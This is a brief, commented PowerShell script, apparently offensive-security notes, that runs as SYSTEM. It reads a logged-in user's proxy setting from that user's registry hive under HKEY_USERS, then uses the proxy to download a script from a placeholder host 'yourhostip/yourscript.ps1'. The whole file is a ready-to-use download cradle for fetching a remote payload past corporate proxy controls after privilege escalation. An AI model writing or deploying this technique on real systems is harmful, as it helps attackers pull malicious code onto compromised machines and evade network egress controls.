##The code will copy user's proxy setting and force system account to download web drive by though a proxy.
##Making System proxy Great Again

##Must map the current user hive to HKU. So we can reslove a registry key
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null

##Now we need to identify a SID for existing users, and then reference to the user HIVE
##Any SID starting with “S-1-5-21-” is a user account exclusive of built-in accounts 

##for loop to find a SID starting with “S-1-5-21-”. save the SID in $start
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}

##Now we can pass in the SID($start) to reference user hive, and use Get-ItemProperty to fetch the content of the registry key
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
##at this point, $proxyAddr contains proxy server IP address and network port from the registry
##turn the contents of the variable into a proxy object that we can assign to  Net.WebClient object
##create a new object from the WebProxy class and assign it as the DefaultWebProxy that is built into all Net.WebClient objects
##WebProxy takes one argument, URL/Proxy port
[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")

$wc = new-object system.net.WebClient
$wc.DownloadString("yourhostip/yourscript.ps1")
